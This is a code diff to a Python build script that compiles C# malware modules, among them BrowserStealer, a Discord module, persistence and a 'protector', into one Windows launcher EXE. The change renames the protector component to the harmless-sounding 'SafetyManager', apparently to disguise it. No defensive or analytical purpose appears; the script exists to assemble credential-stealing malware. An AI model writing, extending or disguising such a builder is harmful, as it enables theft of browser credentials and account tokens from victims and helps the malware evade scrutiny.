@@ -245,7 +245,7 @@ def compile_csharp():
         return False
 
     modules = [
-        ("defense", "protector.cs", "protector.dll", "/target:library /r:System.Security.dll /r:System.Management.dll"),
+        ("defense", "SafetyManager.cs", "SafetyManager.dll", "/target:library /r:System.Security.dll /r:System.Management.dll"),
         ("defense", "persist.cs", "persist.dll", "/target:library"),
         ("native_modules", "BrowserStealer.cs", "BrowserStealer.dll", "/target:library /r:System.Security.dll /r:System.Web.Extensions.dll"),
         ("native_modules", "discord.cs", "discord.dll", "/target:library /r:System.Security.dll"),
@@ -297,7 +297,7 @@ def create_final_launcher(payload_path):
 
         # 2. Prepare Launcher Source
         launcher_src = os.path.join("defense", "launcher.cs")
-        protector_src = os.path.join("defense", "protector.cs")
+        SafetyManager_src = os.path.join("defense", "SafetyManager.cs")
         
         with open(launcher_src, "r", encoding="utf-8") as f:
             content = f.read()
@@ -309,18 +309,18 @@ def create_final_launcher(payload_path):
         with open(tmp_launcher, "w", encoding="utf-8") as f:
             f.write(content)
 
-        # 3. Compile Launcher EXE (linking Protector)
+        # 3. Compile Launcher EXE (linking SafetyManager)
         print_step("Launcher", "Compiling final native EXE...")
         out_exe = os.path.join("dist", f"{OUTPUT_NAME}.exe")
         
-        # We compile launcher and protector together into one EXE for autonomy
+        # We compile launcher and SafetyManager together into one EXE for autonomy
         cmd = [
             CSC_PATH, 
             "/target:winexe", 
             f"/out:{out_exe}", 
             f"/win32manifest:{MANIFEST_FILE}",
             tmp_launcher, 
-            protector_src
+            SafetyManager_src
         ]
         
         subprocess.run(cmd, check=True, capture_output=True)
